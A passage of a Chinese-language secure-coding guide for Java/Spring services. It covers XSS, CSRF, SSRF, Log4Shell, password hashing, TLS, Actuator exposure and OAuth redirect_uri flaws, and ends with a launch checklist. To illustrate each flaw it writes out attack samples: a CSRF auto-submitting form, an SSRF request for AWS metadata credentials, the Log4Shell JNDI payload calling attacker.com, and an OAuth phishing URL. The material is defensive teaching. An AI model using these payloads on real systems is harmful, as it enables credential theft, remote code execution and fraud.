不同上下文的转义规则不一样：

```html
<!-- HTML 文本上下文：转义 < > & " ' -->
<div>{{ comment | escape }}</div>

<!-- HTML 属性上下文：除上述外还要转义空格、换行 -->
<input value="{{ name | attr-escape }}">

<!-- JavaScript 上下文：转义任何非字母数字字符 -->
<script>var n = "{{ name | js-escape }}";</script>

<!-- URL 上下文：encodeURIComponent -->
<a href="/search?q={{ query | url-escape }}">
```

各模板引擎的默认转义：
- **Thymeleaf** `[[${value}]]` 默认 HTML 转义
- **FreeMarker** 需要在 `<#ftl output_format='HTML'>` 才默认转义
- **Vue / React** `{{ }}` / `{value}` 默认转义，但 `v-html` / `dangerouslySetInnerHTML` 是后门

如果业务需要让用户写富文本（HTML 标签），必须用 **HTML sanitizer**：

```java
// OWASP Java HTML Sanitizer
PolicyFactory policy = Sanitizers.FORMATTING
    .and(Sanitizers.LINKS)
    .and(Sanitizers.IMAGES);
String safe = policy.sanitize(userInput);
```

它会按白名单保留 `<b>` `<i>` `<a>` 等"安全"标签，剥离 `<script>` `<iframe>` 和事件属性。

#### 配套防御：HttpOnly + CSP

即使有 XSS 漏洞，下面两个机制能限制损失：

**HttpOnly Cookie**：让 JS 拿不到 cookie。

```java
ResponseCookie cookie = ResponseCookie.from("SESSION", sessionId)
    .httpOnly(true)
    .secure(true)
    .sameSite("Strict")
    .maxAge(Duration.ofHours(1))
    .build();
```

**CSP（Content Security Policy）**：告诉浏览器只信任哪些来源的脚本。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'
```

设了之后即便注入了 `<script src="https://evil.com">` 也会被浏览器拒绝执行。

#### 验证
```bash
# XSStrike 自动化测试
xsstrike -u 'http://localhost:8080/comment' --data 'content=test'

# 手工测试 payload
curl -X POST -d 'content=<script>alert(1)</script>' http://localhost:8080/comment
# 然后看渲染页面 HTML 里 < > 是否被转成 &lt; &gt;
```

> **口诀**：XSS 防御 = **输出转义 + HttpOnly + CSP** 三件套。富文本必须用 sanitizer 而不是黑名单。`v-html` / `innerHTML` 出现在代码评审里要立即拦下。

---

### 案例 ④ CSRF：没有 SameSite Cookie

#### 现象
用户在 evil.com 上点击一个链接，账号余额被转走。

evil.com 的页面：

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

用户的浏览器自动带上 bank.com 的 cookie，bank.com 后端识别为合法请求，转账成功。

#### 根因
这是**CSRF（Cross-Site Request Forgery）**。攻击不需要拿到用户 cookie —— 浏览器会自动带上。

bank.com 没有任何机制区分"请求是否来自合法的 bank.com 页面"。

#### 修复
四种叠加防御，至少选两种：

**方案 A：SameSite Cookie**（最简单，2024 年浏览器默认 Lax）

```java
ResponseCookie cookie = ResponseCookie.from("SESSION", sid)
    .sameSite("Strict")     // Strict / Lax / None
    .secure(true)
    .httpOnly(true)
    .build();
```

| SameSite 值 | 行为 |
| --- | --- |
| **Strict** | 任何跨站请求都不带 cookie（包括点链接进来） |
| **Lax**（默认） | 跨站 GET 带（点链接），跨站 POST 不带 |
| **None** | 全跨站都带（必须配 Secure） |

绝大多数业务用 Lax 即可。Strict 体验稍差（从外部链接进来要重新登录）。

**方案 B：CSRF Token**（最经典）

```java
// Spring Security 默认开启
@Configuration
public class WebSecurityConfig {
    @Bean
    SecurityFilterChain api(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
        return http.build();
    }
}
```

前端每次请求带上 token：

```javascript
const csrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
fetch('/api/transfer', {
    method: 'POST',
    headers: { 'X-XSRF-TOKEN': csrfToken },
    body: JSON.stringify({ to, amount })
});
```

evil.com 拿不到 bank.com 域下的 cookie（同源策略），所以拿不到 csrfToken。

**方案 C：Origin / Referer 校验**

```java
String origin = req.getHeader("Origin");
if (origin == null || !ALLOWED_ORIGINS.contains(origin)) {
    throw new ForbiddenException();
}
```

注意：Referer 可能被代理剥离，Origin 更可靠（POST/PUT/DELETE 浏览器一定带）。

**方案 D：双重提交 Cookie**

把 CSRF token 同时放 cookie 和请求 header，后端校验两者一致。原理同方案 B 但不需要服务端存 token。

#### REST API（用 Bearer Token）需要 CSRF 防护吗？

**不需要**。CSRF 攻击的前提是浏览器自动带 cookie。Bearer Token 必须由 JS 主动放进 Authorization Header，跨站请求不会自动带。

但有个边界场景：**如果你的 API 同时支持 Cookie 和 Bearer 两种鉴权**，必须开 CSRF 防护，否则 Cookie 那条路径会受攻击。

#### 验证
```bash
# 写一个 POST 表单到自己的 evil.html，看是否能转账成功
# 修复前：成功；修复后：被 CSRF token 校验拦下
```

> **口诀**：**SameSite=Lax + CSRF Token** 是 2024 年的标配。纯 Bearer Token 的 API 可不开 CSRF，但混合鉴权必须开。

---

### 案例 ⑤ SSRF：服务端请求伪造

#### 现象
某图片代理服务，用户传图片 URL，后端下载并展示。攻击者传：

```
http://image-proxy/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

返回了 AWS EC2 实例的临时凭据。攻击者用这个凭据登入 AWS 控制台，拿走了所有数据。

#### 根因
**SSRF（Server-Side Request Forgery）**：攻击者诱使服务器去请求攻击者指定的 URL。常见目标：
- 云元数据服务（AWS/GCP/Azure 的 169.254.169.254 / metadata.google.internal）
- 内网服务（http://192.168.x.x:port，攻击内网 Redis、Elasticsearch）
- 本地服务（http://127.0.0.1:port）
- 特殊协议（file:// / gopher:// 触发其他攻击）

这是 OWASP 2021 新增到 Top 10 的（A10），因为云原生时代成了高频事故。

#### 修复
**根本防御**：白名单 + DNS 重绑定防御 + 协议限制。

```java
public class SafeHttpClient {
    private static final Set<String> ALLOWED_HOSTS = Set.of(
        "cdn.example.com", "images.example.com");

    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");

    public byte[] fetch(String urlStr) throws IOException {
        URL url = new URL(urlStr);

        if (!ALLOWED_SCHEMES.contains(url.getProtocol().toLowerCase())) {
            throw new SecurityException("scheme not allowed: " + url.getProtocol());
        }
        if (!ALLOWED_HOSTS.contains(url.getHost().toLowerCase())) {
            throw new SecurityException("host not allowed: " + url.getHost());
        }

        // ★ 关键：解析 DNS，确认是公网 IP
        InetAddress[] addrs = InetAddress.getAllByName(url.getHost());
        for (InetAddress addr : addrs) {
            if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
                || addr.isSiteLocalAddress() || isCloudMetadata(addr)) {
                throw new SecurityException("internal IP blocked: " + addr);
            }
        }

        return download(url);
    }

    private boolean isCloudMetadata(InetAddress addr) {
        String ip = addr.getHostAddress();
        return ip.equals("169.254.169.254")    // AWS / Azure
            || ip.equals("100.100.100.200");   // 阿里云
    }
}
```

**陷阱：DNS 重绑定（DNS Rebinding）攻击**

攻击者控制的域名 evil.com 第一次解析返回公网 IP（通过白名单），第二次解析返回 127.0.0.1。如果代码"先 DNS 解析校验，后用 URL 发请求"，第二次连接时拿到的是内网 IP。

防御：解析后用解析得到的 IP 直接发请求，不再走 DNS：

```java
URL url = new URL(urlStr);
InetAddress addr = InetAddress.getByName(url.getHost());
// 校验 addr ...
URL safeUrl = new URL(url.getProtocol(), addr.getHostAddress(), url.getPort(), url.getFile());
// 用 safeUrl 发请求，并通过 Host header 保留原 host（如果服务端按 Host 路由）
```

**云原生最佳实践**：禁用元数据服务的 v1（AWS IMDSv1），强制用 v2（要求 PUT 请求 + token）：

```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-endpoint enabled
```

IMDSv2 的请求方式：

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/
```

SSRF 攻击只能 GET 默认无 header，IMDSv2 直接拒绝。

#### 验证
```bash
# 试图访问元数据
curl 'http://image-proxy/?url=http://169.254.169.254/latest/meta-data/'
# 修复后应返回 403

# 试图访问内网
curl 'http://image-proxy/?url=http://192.168.1.1/'
# 修复后应返回 403
```

> **口诀**：SSRF 防御 = **协议白名单 + 域名白名单 + 解析后 IP 校验 + 防 DNS 重绑定**。云上必开 IMDSv2。

---

### 案例 ⑥ 依赖 CVE：Log4Shell 类型事故

#### 现象
2021 年 12 月某天，安全团队收到 Log4j 远程代码执行漏洞（CVE-2021-44228，CVSS 10.0）通报。问题：**有几百个微服务，怎么 1 小时内确认线上有没有受影响、怎么修？**

#### 根因
Log4Shell 的攻击 payload：

```
${jndi:ldap://attacker.com/exploit}
```

只要这串字符进入了 Log4j 的日志输出（HTTP Header / 用户输入 / UA / Referer 都可），Log4j 会主动连 attacker.com 拉一个 Java 类下来执行。

根源是 Log4j 的"消息查找替换"特性，1.x 时就有，但 2.x 加上 JNDI 查找让攻击面扩大到致命。

#### 修复

**第一步：检测**

需要 SBOM（Software Bill of Materials，软件物料清单）。如果项目用 Maven：

```bash
# 列出所有依赖（含传递依赖）的 log4j-core
mvn dependency:tree | grep log4j-core

# 或全公司一起找
find . -name "*.jar" | xargs -I {} sh -c 'unzip -l {} | grep -l log4j-core'
```

更系统化用 Trivy / Grype 扫描制品：

```bash
trivy image my-app:latest --severity HIGH,CRITICAL

# 或扫描 jar
trivy fs ./target/my-app.jar
```

CI 流水线里集成 SCA（Software Composition Analysis）：

```yaml
# GitHub Actions
- name: Snyk vulnerability scan
  uses: snyk/actions/maven@master
  with:
    args: --severity-threshold=high
```

**第二步：临时缓解**（升级前的应急）

```bash
# JVM 参数禁用 JNDI lookup（仅 Log4j 2.10+ 有效）
-Dlog4j2.formatMsgNoLookups=true

# 或环境变量
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 或删除 JndiLookup class（最彻底）
zip -q -d log4j-core-2.14.1.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

**第三步：升级**

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>   <!-- 或更新 -->
</dependency>
```

注意要扫一遍传递依赖：很多框架（Spring Boot、Elasticsearch Client）会引入老版本 log4j-core。Maven 用 `<dependencyManagement>` 锁版本：

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.17.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.17.1</version>
        </dependency>
    </dependencies>
</dependencyManagement>
```

**第四步：长效机制**

1. **强制 SBOM**：每个制品 build 时生成 SBOM（CycloneDX / SPDX 格式）

```xml
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.7.10</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals><goal>makeAggregateBom</goal></goals>
        </execution>
    </executions>
</plugin>
```

2. **依赖告警自动化**：Dependabot / Renovate 自动开 PR 升级有 CVE 的依赖

3. **运行时防护**：RASP（Runtime Application Self-Protection）能在运行时拦截 JNDI 调用

#### 验证
```bash
# 用著名的 log4shell 测试 payload
curl -H 'User-Agent: ${jndi:ldap://your-monitor.com/test}' http://your-app/

# 修复后 your-monitor.com 应该收不到 LDAP 请求
```

> **口诀**：依赖 CVE 应急流程 = **SBOM 检测 → 临时缓解 → 升级 → 长效自动化**。生产必须有"扫"和"挡"两层：SCA 在 CI 拦，RASP 在运行时拦。

---

### 案例 ⑦ 密码用 MD5 存储 —— "彩虹表 5 分钟破解 70%"

#### 现象
某老系统被拖库，用户表里的 password 列是 32 位十六进制（MD5 哈希）。攻击者拿去查彩虹表，5 分钟解出 70% 用户的明文密码。

#### 根因

MD5 不该用做密码哈希的几个原因：
1. **快**：在 GPU 上每秒能算几百亿次。这意味着暴力破解极便宜
2. **无盐**：相同密码哈希值相同，彩虹表（预计算的"明文 → 哈希"表）能一次破解所有用相同密码的账号
3. **碰撞已破**：2004 年 MD5 碰撞被找到，虽然不影响密码场景，但彻底失去公信力

SHA-1 / SHA-256 也有同样问题（除了"快"）—— **它们设计上就要快**，但密码哈希需要"慢"才能对抗暴力破解。

#### 修复

**业界共识**：密码哈希用 **专门设计的慢哈希**：

| 算法 | 提出年份 | 特点 | 推荐度 |
| --- | --- | --- | --- |
| **PBKDF2** | 2000 | 老牌，可调迭代次数；不抗 GPU/ASIC | 兼容场景用 |
| **BCrypt** | 1999 | 内存稍占用，抗 GPU 较好；72 字节输入上限 | 仍是默认推荐 |
| **scrypt** | 2009 | 大内存设计，抗 ASIC | 不如 Argon2 |
| **Argon2id** | 2015 | 密码哈希竞赛获胜者；同时调时间/内存/并行 | **新系统首选** |

Spring Security 用 BCrypt：

```java
@Bean
PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);   // strength=12，约 250ms/次
}

// 注册
String hash = passwordEncoder.encode(rawPassword);
// 验证
passwordEncoder.matches(rawPassword, hash);
```

`strength` 决定迭代轮数（2^strength）。10 → 100ms；12 → 400ms；14 → 1.5s。**以"用户登录能接受的延迟"为上限**，越大越安全。

Argon2id（用 BouncyCastle）：

```java
Argon2BytesGenerator generator = new Argon2BytesGenerator();
Argon2Parameters params = new Argon2Parameters.Builder(Argon2Parameters.ARGON2_id)
    .withVersion(Argon2Parameters.ARGON2_VERSION_13)
    .withIterations(3)         // t
    .withMemoryAsKB(65536)     // m: 64MB
    .withParallelism(4)        // p
    .withSalt(salt)
    .build();
generator.init(params);
byte[] hash = new byte[32];
generator.generateBytes(password.getBytes(), hash);
```

OWASP 2024 推荐参数：m=46MB / t=1 / p=1（或更高）。

#### 盐 vs 胡椒

- **Salt（盐）**：每个用户唯一的随机值，**和密码哈希一起存**。防止彩虹表。BCrypt / Argon2 都自动加盐。
- **Pepper（胡椒）**：全系统共享的密钥，**单独存（如 KMS）**。防止"DB 拖库 + 字典攻击"。

```java
// 同时用 salt 和 pepper
String pepperedPassword = HmacSha256(pepper, rawPassword);
String hash = bcrypt(pepperedPassword);
```

胡椒泄漏 = 等于没用胡椒，所以胡椒必须比 DB 更难拖。生产中放 KMS / Vault。

#### 平滑迁移老系统

不能要求用户重新设密码。在登录时**懒升级**：

```java
public boolean login(String user, String rawPassword) {
    String dbHash = repo.findHashByUser(user);

    if (dbHash.startsWith("$2a$") || dbHash.startsWith("$2b$")) {
        // 已经是 BCrypt
        return bcrypt.matches(rawPassword, dbHash);
    } else {
        // 老 MD5
        if (!md5(rawPassword).equals(dbHash)) return false;
        // ★ 验证通过就升级
        repo.updateHash(user, bcrypt.encode(rawPassword));
        return true;
    }
}
```

#### 验证
- 用 hashcat 或 john 跑你的密码哈希字典攻击
- MD5：每秒数十亿次
- BCrypt cost=12：每秒几次（GPU 上几百次）
- Argon2id 64MB：每秒不到 100 次

> **口诀**：密码必须慢哈希。**新系统 Argon2id，兼容用 BCrypt，禁用 MD5/SHA**。盐自动加，胡椒手动加放 KMS。

---

### 案例 ⑧ HTTPS 配置弱 —— "TLS 1.0 + 弱 cipher 被 BEAST 攻击"

#### 现象
等保测评：发现某接口启用了 TLS 1.0，且支持 RC4-SHA、3DES 等弱 cipher。整改要求："禁用 TLS 1.0 / 1.1，禁用所有弱算法"。

#### 根因

为兼容 IE6 / Android 4 这些老客户端，运维默认开了所有协议版本和算法。但：
- **TLS 1.0 / 1.1**：BEAST、POODLE、Lucky 13 等多个攻击；2020 年浏览器全面禁用
- **RC4**：流密码，2013 年被证明有偏置漏洞（RFC 7465 禁用）
- **3DES**：被 Sweet32 攻击（CVE-2016-2183），仅 168-bit key 实际等价 80-bit
- **SSL v3**：POODLE 攻击，已废弃多年
- **静态 RSA 密钥交换**：无前向保密

#### 修复

**Nginx 推荐配置**：

```nginx
ssl_protocols TLSv1.2 TLSv1.3;

# Mozilla intermediate（兼容性 + 安全性平衡）
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers off;     # TLS 1.3 时代客户端优先

# DH 参数（2048+ bit）
ssl_dhparam /etc/nginx/dhparam.pem;

# OCSP Stapling
ssl_stapling on;
ssl_stapling_verify on;

# HSTS：告诉浏览器"以后只用 HTTPS"
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# 禁用 SSL 会话票据复用（防长期密钥泄漏导致的回放）
ssl_session_tickets off;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
```

**Spring Boot 内嵌 Tomcat**：

```yaml
server:
  ssl:
    enabled: true
    protocol: TLS
    enabled-protocols: TLSv1.2,TLSv1.3
    ciphers:
      - TLS_AES_256_GCM_SHA384
      - TLS_AES_128_GCM_SHA256
      - TLS_CHACHA20_POLY1305_SHA256
      - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
      - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
```

**HSTS 注意事项**：一旦客户端收到 HSTS 头，未来 max-age 时间内只用 HTTPS。**配错（max-age 给得太大、子域名出问题）会让用户访问不到**。建议先配小 max-age 测试，再逐步加大。`preload` 是把你的域名提交到浏览器内置的 HSTS 列表，撤销极困难。

#### 工具

```bash
# 在线扫描（最权威）
https://www.ssllabs.com/ssltest/

# 命令行
nmap --script ssl-enum-ciphers -p 443 example.com

# testssl.sh（最详细）
./testssl.sh https://example.com
```

#### 证书管理

证书过期是经典事故。每年 N 个公司因证书过期挂掉（包括 Microsoft Teams、LinkedIn）。

自动化方案：
- **Let's Encrypt + certbot**：免费证书 + 自动续期（每 90 天）
- **AWS ACM / 阿里云 SSL**：托管证书自动续期 + 与 ELB / CDN 集成
- **cert-manager** (K8s)：声明式证书管理

```bash
# certbot 自动续期 cron
0 2 * * * certbot renew --quiet --post-hook "systemctl reload nginx"
```

#### 验证
```bash
./testssl.sh https://your-domain.com
# 期望：
# - Protocols: TLSv1.2 + TLSv1.3 only
# - 所有 cipher 是 ECDHE 或 DHE 系列（前向保密）
# - 没有 RC4 / 3DES / Anonymous DH
# - HSTS header 存在且 max-age >= 31536000
# - SSL Labs 评级 A+
```

> **口诀**：**仅 TLS 1.2/1.3，仅 AEAD cipher（GCM/ChaCha20-Poly1305），开 HSTS，自动续证**。SSL Labs A+ 是最低标准，A+ 不是优等是基线。

---

### 案例 ⑨ Spring Security 配置错误 —— "默认开放某些 endpoint"

#### 现象
渗透测试发现 `/actuator/heapdump` 能匿名访问，下载到完整的 JVM 内存快照。攻击者在 dump 里搜到数据库连接密码、JWT 签名密钥、用户 token。

#### 根因
Spring Boot Actuator 默认暴露了一堆 endpoint：

```yaml
# 默认配置
management:
  endpoints:
    web:
      exposure:
        include: health,info     # 默认只这两个
```

但很多团队为了"方便调试"改成：

```yaml
management:
  endpoints:
    web:
      exposure:
        include: '*'             # ★ 灾难
```

或代码里关掉了 Spring Security：

```java
// ❌ 致命
@Configuration
public class WebSecurityConfig {
    @Bean
    SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(a -> a.anyRequest().permitAll());
        return http.build();
    }
}
```

危险 endpoint 一览：

| Endpoint | 风险 |
| --- | --- |
| `/actuator/heapdump` | JVM 堆快照（含密钥、密码） |
| `/actuator/env` | 所有环境变量（含密码） |
| `/actuator/configprops` | 所有配置属性 |
| `/actuator/threaddump` | 所有线程栈（可能泄漏业务逻辑） |
| `/actuator/loggers` | 可远程改日志级别（可能 DoS） |
| `/actuator/jolokia` | JMX over HTTP（可远程执行） |
| `/actuator/mappings` | 暴露所有路由 |

#### 修复

**配置层**：

```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info,prometheus      # 只暴露需要的
      base-path: /internal/actuator          # 改默认路径，让爬虫扫不到
  endpoint:
    health:
      show-details: when-authorized          # 详细信息要鉴权
  server:
    port: 9090                                # 单独端口，不和业务端口同
    address: 127.0.0.1                       # 仅本机访问
```

把 actuator 放到独立端口 + 仅本机监听，外部根本连不上。Prometheus 抓取走 sidecar / DaemonSet。

**代码层**：

```java
@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(a -> a
            .requestMatchers("/actuator/health", "/actuator/info").permitAll()
            .requestMatchers("/actuator/**").hasRole("ACTUATOR_ADMIN")
            .anyRequest().authenticated())
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
```

**Spring Security 6 的 lambda DSL 注意事项**：

新版本要求显式定义所有规则。旧的 `antMatchers` / `mvcMatchers` 已废弃，用 `requestMatchers`：

```java
// ❌ 6.0 已删除
.antMatchers("/api/**").authenticated()

// ✅ 6.x 写法
.requestMatchers("/api/**").authenticated()
```

#### 其他常见配置坑

1. **CORS 过宽**：

```java
// ❌
config.addAllowedOrigin("*");
config.addAllowedMethod("*");
config.setAllowCredentials(true);   // 配 * 同时允许 credentials 是非法组合，浏览器会拒绝
                                    // 但开发者经常配错以为没事

// ✅
config.setAllowedOrigins(List.of("https://app.example.com"));
config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
```

2. **错误处理泄漏堆栈**：

```yaml
# ❌ 默认在生产环境会展示完整堆栈
server.error.include-stacktrace: always

# ✅
server.error.include-stacktrace: never
server.error.include-message: never
```

3. **H2 console 在生产环境**：

```yaml
# ❌ 上线前忘关
spring.h2.console.enabled: true

# ✅ 用 profile 隔离
spring:
  profiles:
    active: prod
---
spring:
  config.activate.on-profile: dev
  h2.console.enabled: true
```

#### 验证
```bash
# 内网/外网都试一下
curl http://your-app/actuator/heapdump
# 期望：404 或 401，不能下载

curl http://your-app/actuator/env
# 期望：401

# 自动化扫描
nikto -h http://your-app
```

> **口诀**：**Actuator 单独端口 + 内网监听 + 鉴权**。CORS 不要 `*`。错误页禁堆栈。H2 console 用 profile 隔离。

---

### 案例 ⑩ OAuth2 redirect_uri 没校验 —— "钓鱼拿走 token"

#### 现象
某社交平台的 OAuth2 提供方，攻击者构造钓鱼链接：

```
https://victim-social.com/oauth/authorize
  ?client_id=legit-app-id
  &response_type=code
  &redirect_uri=https://victim-social.com.evil.com/cb
  &state=xyz
```

用户看到 `victim-social.com` 域名以为是合法的，登录授权后被重定向到 `victim-social.com.evil.com/cb` —— 这其实是 evil.com 的子域，code 被攻击者拿到。

攻击者用 code + 偷来的 client_secret 换 token，能以用户身份操作。

#### 根因
授权服务器对 `redirect_uri` 没做严格校验：
- 只用了模糊匹配（`startsWith` / 正则没锁紧）
- 或者用了 `endsWith("victim-social.com")` 之类的 bug

`victim-social.com.evil.com` 看起来像 `victim-social.com` 的子域，实际是 `evil.com` 的子域 —— 这是经典的 hostname 误读漏洞。

#### 修复

**RFC 6749 + OAuth 2.1 的强制要求**：

1. **redirect_uri 必须 exact match**（精确字符串匹配，不是前缀/正则）

```java
// 注册时
RegisteredClient client = RegisteredClient.withId(...)
    .clientId("legit-app")
    .redirectUri("https://app.example.com/oauth/callback")     // ★ 精确
    .redirectUri("https://app.example.com/oauth/callback2")    // 多个就列多个
    .build();

// 校验时
if (!client.getRedirectUris().contains(requestedRedirectUri)) {
    throw new OAuth2Exception("invalid_redirect_uri");
}
```

不允许通配符（`https://*.example.com`）、不允许只比对域名。

2. **state 参数必须校验**

state 是 CSRF token 的 OAuth 版本。客户端发起 authorize 时生成随机 state，存到 session；callback 时校验返回的 state 和 session 里的一致。

```java
// 发起
String state = UUID.randomUUID().toString();
session.setAttribute("oauth_state", state);
return "redirect:https://provider/authorize?...&state=" + state;

// callback
String returnedState = request.getParameter("state");
String savedState = (String) session.getAttribute("oauth_state");
if (!savedState.equals(returnedState)) {
    throw new SecurityException("state mismatch");
}
session.removeAttribute("oauth_state");
```

不校验 state 会让攻击者绑定别人的 OAuth 账号到自己的 App 账号上（"OAuth 账号绑定型 CSRF"）。

3. **PKCE 强制**（前面 2.2 节）

4. **同源策略检查**（防 referer 泄漏 code）

   - 授权页面禁用 referer：`<meta name="referrer" content="no-referrer">`
   - 或返回时用 `Referrer-Policy: no-referrer` header

5. **Mix-up 攻击防御**

如果客户端支持多个 OAuth 提供方，攻击者可能让 user 在 A 上授权，code 提交给 B —— 客户端会用 B 的 client_secret 去 A 换 token，可能成功（如果 A B 的 client_secret 一样的低概率事件）。

防御：在 callback 时记录"这次发起了哪个 issuer"，在换 token 时严格匹配。OIDC 通过 ID Token 的 `iss` claim 自动防御。

#### 验证

```bash
# 试图用攻击者域名做 redirect_uri
curl -i 'https://your-auth/oauth/authorize?client_id=legit&redirect_uri=https://evil.com/cb&response_type=code'

# 期望：返回 400 invalid_redirect_uri，不是 302 跳转
```

> **口诀**：**redirect_uri 精确匹配，state 必校验，强制 PKCE**。OAuth2 的钓鱼防御 80% 在这三件事上。

---

## 5. 上线检查清单

打印贴墙 / 加进 Code Review checklist。

### 认证
- [ ] 登录密码用 BCrypt（cost ≥ 12）或 Argon2id 哈希
- [ ] 不存明文密码 / SHA / MD5
- [ ] 关键操作（改密码、转账、批量删除）要求二次认证（短信 / TOTP）
- [ ] 登录失败次数 + IP 限制（防止撞库）
- [ ] 登录成功的 session 滚动 ID（防 Session Fixation）
- [ ] 登出 / 改密码 / 离职后立即吊销所有现有 token
- [ ] OAuth2 redirect_uri 精确匹配，state 校验，强制 PKCE
- [ ] JWT 锁定 alg，不接受客户端传的 alg
- [ ] JWT 使用短 access_token + Refresh Rotation
- [ ] JWT 有 jti + 黑名单 Redis
- [ ] OIDC 校验 id_token 的 iss / aud / exp / nonce

### 授权
- [ ] 每个 endpoint 显式声明权限（@PreAuthorize / SecurityFilterChain matcher）
- [ ] 默认 deny，白名单 allow
- [ ] 横向越权检查：操作他人资源时校验 ownership
- [ ] 纵向越权检查：管理员功能必须 hasRole
- [ ] Actuator 单独端口 + 内网监听 + 鉴权
- [ ] 服务账号最小权限（DB 只 GRANT 必要表 / IAM Policy 最小化）
- [ ] mTLS（服务网格 / Istio）做服务间双向认证

### 加密
- [ ] HTTPS 仅 TLS 1.2 + 1.3，禁 1.0/1.1
- [ ] cipher 只用 AEAD（GCM / ChaCha20-Poly1305）
- [ ] HSTS 开启，max-age ≥ 1 年
- [ ] 证书自动续期（Let's Encrypt / ACM / cert-manager）
- [ ] SSL Labs 评级 A+
- [ ] PII / 信用卡 / 密钥用 KMS 信封加密
- [ ] 不用 ECB 模式；CBC 必须配 HMAC（Encrypt-then-MAC）
- [ ] AES-GCM 的 IV 每次随机，不复用
- [ ] 不自己实现密码算法
- [ ] 国密合规要求时用 SM2 / SM3 / SM4

### 输入验证
- [ ] SQL 用预编译参数；ORDER BY / 表名等结构用白名单
- [ ] 模板引擎默认开 HTML 转义（Thymeleaf / Vue / React 默认开）
- [ ] 富文本用 OWASP HTML Sanitizer，不用黑名单
- [ ] CSP 头部署（至少 default-src 'self'）
- [ ] 文件上传：白名单后缀 + magic number 校验 + 隔离存储 + 不允许执行
- [ ] URL 参数 / Header / Cookie 输入做长度上限
- [ ] SSRF：协议白名单 + 域名白名单 + 解析后 IP 校验 + 防 DNS 重绑定
- [ ] 反序列化白名单（禁用 ObjectInputStream 接受不可信数据）
- [ ] XML 解析禁 DTD / 实体（防 XXE）

### 监控
- [ ] 安全事件审计日志（登录、授权失败、敏感操作）
- [ ] WAF / RASP 接入（Log4Shell 类型应急）
- [ ] CI 集成 SAST（Semgrep）+ SCA（Snyk / Trivy）
- [ ] CD 集成 DAST（OWASP ZAP）
- [ ] 制品出 SBOM（CycloneDX / SPDX）
- [ ] 依赖 CVE 自动告警 + 自动开 PR（Dependabot / Renovate）
- [ ] 定期渗透测试（季度 / 重大上线前）
- [ ] 监控异常登录地点 / 异常频次 / 异常时段
- [ ] 错误页禁堆栈 / DB 信息 / 路径泄漏

### 配置
- [ ] 不在代码 / 镜像 / 配置库存密钥（用 KMS / Vault / Sealed Secrets）
- [ ] dev / prod 配置严格隔离（profile + 不同密钥）
- [ ] H2 console / Swagger UI 仅 dev profile 启用
- [ ] CORS 不要 `*`
- [ ] Cookie 必须 Secure + HttpOnly + SameSite
- [ ] 所有 endpoint 强制 HTTPS（HSTS + 应用层重定向 80→443）

---

## 6. 还能往下挖什么

读完上面 10 个案例只是起点。如果想再深一层：

### 无密码认证：WebAuthn / Passkey
- **WebAuthn**（W3C 标准）：浏览器原生支持 FIDO2，公钥认证，无密码可钓
- **Passkey**：Apple/Google/Microsoft 联合推动的 WebAuthn 落地形态，凭据云同步，跨设备
- 实现：Java 用 [WebAuthn4j](https://github.com/webauthn4j/webauthn4j)
- 注意：Passkey 不能完全替代密码 —— 设备丢失/账号迁移仍需 fallback

### mTLS 与零信任
- 服务网格（Istio / Linkerd）的自动 mTLS 注入
- SPIFFE / SPIRE 工作负载身份证书框架
- BeyondCorp（Google 零信任白皮书）的实践
- 端到端：从 Client → API Gateway → 微服务全链路 mTLS

### 密钥管理：Vault / Sealed Secrets
- HashiCorp Vault 的动态秘密（Dynamic Secrets）：DB 密码每次生成临时账号
- Bitnami Sealed Secrets：把加密的 secret 存进 Git 仓库
- AWS Secrets Manager / GCP Secret Manager 的轮换 API
- KMS 与 Vault 的关系：Vault 后端可挂 KMS 做主密钥保管

### 供应链安全：SBOM + SLSA
- **SLSA**（Supply-chain Levels for Software Artifacts）：4 个等级的供应链安全成熟度
- **in-toto**：从源码到制品的全链路签名
- **Sigstore / Cosign**：容器镜像签名，"无密钥"短期凭据
- **GitHub Artifact Attestations**：构建时自动出 SLSA provenance
